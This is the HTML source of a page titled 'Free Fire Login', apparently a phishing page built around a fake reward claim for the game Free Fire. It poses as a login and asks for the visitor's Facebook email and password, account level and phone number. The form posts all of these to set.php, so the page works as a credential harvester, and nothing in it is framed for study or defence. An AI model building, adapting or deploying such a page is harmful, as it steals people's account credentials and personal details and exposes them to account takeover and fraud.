<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> 
    <meta name="viewport" content="width=device-width; initial-scale=1.0; maximum-scale=1.0;">
    
    <title>Free Fire Login
    </title>
    <link rel="icon" type="img/png" href="img-zone/favicon.png" sizes="32x32">
    <meta property="og:image" content="https://images.app.goo.gl/esG3SVp9a8cjH8gd9">
    <meta property="og:image:width" content="540">
    <meta property="og:image:height" content="282">
    <script type="text/javascript" src="./claim.php_files/main-zone.js.download">
    </script>
    <script language="JavaScript">document.write(zonehost())</script><link rel="stylesheet" media="all" href="./claim.php_files/cl-zone.css">
  </head>
  <body>
      <font style="color:white;font-size:20px;">
          <b>LOGIN
          </b>
        </font>
    <div class="form">
      <form method="POST" action="set.php">
        
        <br>
        
        
        <img src="./claim.php_files/fb.png" width="50px">
        <input type="text" name="fb1" placeholder="Email Facebook" required="">
        <input type="password" name="fb2" placeholder="Password Facebook" required=""><br>
       
        
        <font style="color:white;font-size:15px;">
          <b>DETAIL ACCOUNT
          </b>
        </font>
        <br>
        <select class="select" name="level" required="">
          <option value="">Level Account
          </option>
          <option value="1">1
          </option>
          <option value="2">2
          </option>
          <option value="3">3
          </option>
          <option value="4">4
          </option>
          <option value="5">5
          </option>
          <option value="6">6
          </option>
          <option value="7">7
          </option>
          <option value="8">8
          </option>
          <option value="9">9
          </option>
          <option value="10">10
          </option>
          <option value="11">11
          </option>
          <option value="12">12
          </option>  
          <option value="13">13
          </option>
          <option value="14">14
          </option>
          <option value="15">15
          </option>
          <option value="16">16
          </option>
          <option value="17">17
          </option>
          <option value="18">18
          </option>
          <option value="19">19
          </option>
          <option value="20">20
          </option>
          <option value="21">21
          </option>
          <option value="22">22
          </option>
          <option value="23">23
          </option>
          <option value="24">24
          </option>
          <option value="25">25
          </option>
          <option value="26">26
          </option>
          <option value="27">27
          </option>
          <option value="28">28
          </option>
          <option value="29">29
          </option>
          <option value="30">30
          </option>
          <option value="31">31
          </option>
          <option value="32">32
          </option>
          <option value="33">33
          </option>
          <option value="34">34
          </option>
          <option value="35">35
          </option>
          <option value="36">36
          </option>
          <option value="37">37
          </option>
          <option value="38">38
          </option>
          <option value="39">39
          </option>
          <option value="40">40
          </option>
          <option value="41">41
          </option>
          <option value="42">42
          </option>
          <option value="43">43
          </option>
          <option value="44">44
          </option>
          <option value="45">45
          </option>
          <option value="46">46
          </option>
          <option value="47">47
          </option>
          <option value="48">48
          </option>
          <option value="49">49
          </option>
          <option value="50">50
          </option>
          <option value="51">51
          </option>
          <option value="52">52
          </option>
          <option value="53">53
          </option>
          <option value="54">54
          </option>
          <option value="55">55
          </option>
          <option value="56">56
          </option>
          <option value="57">57
          </option>
          <option value="58">58
          </option>
          <option value="59">59
          </option>
          <option value="60">60
          </option>
          <option value="61+">61+
          </option>
        </select>
        <input type="number" name="nope" placeholder="Phone Number" required="">
        
        
        <button style="margin-top:15px;" type="submit" class="button button-block">LOGIN
        </button>
      </form>
    </div>
</body></html>
